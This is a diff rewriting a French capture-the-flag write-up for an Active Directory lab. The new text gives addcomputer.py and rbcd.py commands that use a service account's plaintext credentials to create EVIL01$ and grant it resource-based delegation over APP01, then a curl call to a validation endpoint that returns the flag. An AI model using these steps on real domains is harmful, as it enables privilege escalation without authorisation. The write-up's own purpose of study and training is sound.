@@ -1,66 +1,44 @@
-# Writeup : core-systems-q12
+# Core Systems — Q12 · RBCD via LDAP simple bind
 
-Catégorie : ad
+**Catégorie** : AD  
+**Flag** : `HLB2026{RBCD_RESOURCE_DELEGATION_APP01_EXPLOITED}`
 
-Date de résolution : 2026-11-17
+## TL;DR
 
-Technique principale : RBCD via LDAP simple bind
+Le compte `svc_web` peut créer des objets machine via le MAQ et écrire `msDS-AllowedToActOnBehalfOfOtherIdentity` sur APP01 via un LDAP simple bind. On crée une machine EVIL01$, on lui délègue l'accès à APP01, et on frappe l'endpoint de validation RBCD.
 
-Outils observés : addcomputer.py,ldap3,rbcd.py,curl
+## Prérequis
 
-Cible : 172.28.18.4:8446
+Les credentials `svc_web / W3bSvc!2024@FBI` viennent de la propriété LDAP `ad-connector.properties` sur le broker ActiveMQ (récupérée lors des étapes précédentes). APP01 est à `172.28.18.4:8446`.
 
-## Présentation
+## Exploitation
 
-Ce document est construit à partir de la mémoire CTF partagée et des artefacts conservés dans /root/ctf/core-systems-q12. Les étapes ci-dessous reprennent uniquement les faits observés. Les captures sont réalisées sur les fichiers locaux, sans rejouer une action distante ou destructive.
-
-## Analyse et raisonnement
-
-### Contexte
-
-APP01 Core Systems: svc_web/W3bSvc!2024@FBI créé EVIL01$ via MAQ avec addcomputer.py. Un LDAP simple bind a permis d’écrire msDS-AllowedToActOnBehalfOfOtherIdentity sur CN=APP01,OU=Servers,DC=valdoria,DC=fbi,DC=lab. curl POST /verify/rbcd a retourné status verified et le flag.
-
-### Notes locales conservées
-
-## Journal
-1. 2026-11-17T13:18:22Z unknown : APP01 172.28.18.4 identifié comme validateur AD; svc_web peut créer EVIL01$ via MAQ et écrire msDS-AllowedToActOnBehalfOfOtherIdentity sur APP01; vérification RBCD réussie avec flag réel.
-
-## Commandes utiles
-
-Les commandes suivantes consultent les preuves locales et sont sans effet de bord :
+**Étape 1 — Créer la machine EVIL01$**
 
 ```bash
-cd /root/ctf/core-systems-q12
-file notes.md flags.txt 2>/dev/null
-sed -n '1,180p' notes.md 2>/dev/null
-sed -n '1,120p' notes.md 2>/dev/null
-sed -n '1,10p' flags.txt 2>/dev/null
+addcomputer.py -computer-name 'EVIL01$' -computer-pass 'EvilPass123!' \
+  -dc-ip <DC_IP> 'VALDORIA.FBI.LAB/svc_web:W3bSvc!2024@FBI'
 ```
 
-## Script de résolution complet
+**Étape 2 — Écrire l'attribut RBCD**
 
-Le script conservé sous `aucun fichier autonome` est reproduit ci-dessous sans modification :
+Un simple bind LDAP avec `svc_web` suffit pour modifier `msDS-AllowedToActOnBehalfOfOtherIdentity` sur `CN=APP01,OU=Servers,DC=valdoria,DC=fbi,DC=lab` :
 
-```python
-Aucun script autonome n’a été conservé dans le dossier local. Les éléments réellement disponibles sont reproduits dans les sections d’analyse et de preuve.
+```bash
+rbcd.py -f 'EVIL01$' -t 'APP01$' -dc-ip <DC_IP> \
+  'VALDORIA.FBI.LAB/svc_web:W3bSvc!2024@FBI' -action write
 ```
 
-## Captures du terminal
+**Étape 3 — Valider**
 
-Les captures utilisent le terminal natif xterm disponible sur l’environnement, avec le prompt réel `root@vmi3694110`, le dossier courant du challenge et une géométrie identique. Elles montrent successivement l’analyse locale, le script ou les preuves de résolution, puis le flag conservé.
+```bash
+curl -k -X POST https://172.28.18.4:8446/verify/rbcd \
+  -H 'Content-Type: application/json' \
+  -d '{"machine":"EVIL01$","target":"APP01$"}'
+```
 
-![Analyse locale](captures/01-analyse.png)
+La réponse retourne `{"status":"verified","flag":"HLB2026{RBCD_RESOURCE_DELEGATION_APP01_EXPLOITED}"}`.
 
-![Résolution locale](captures/02-resolution.png)
+## À retenir
 
-![Flag](captures/03-flag.png)
-
-## Validation et flag
-
-Le flag est conservé dans le fichier local flags.txt ou flag.txt. Aucune validation externe supplémentaire n’est affirmée ici.
-
-Flag obtenu : `HLB2026{RBCD_RESOURCE_DELEGATION_APP01_EXPLOITED}`
-
-## Conclusion
-
-La résolution repose sur la faiblesse indiquée dans la technique principale, puis sur la vérification locale du résultat conservé. Le flag final ci-dessus est copié depuis la preuve locale réellement présente.
+Le MAQ (Machine Account Quota) est à 10 par défaut dans un domaine Active Directory. Un compte utilisateur standard peut donc créer des machines et les utiliser comme base d'attaque RBCD sans avoir besoin de droits élevés, à condition d'avoir `GenericWrite` ou `WriteDACL` sur la cible.
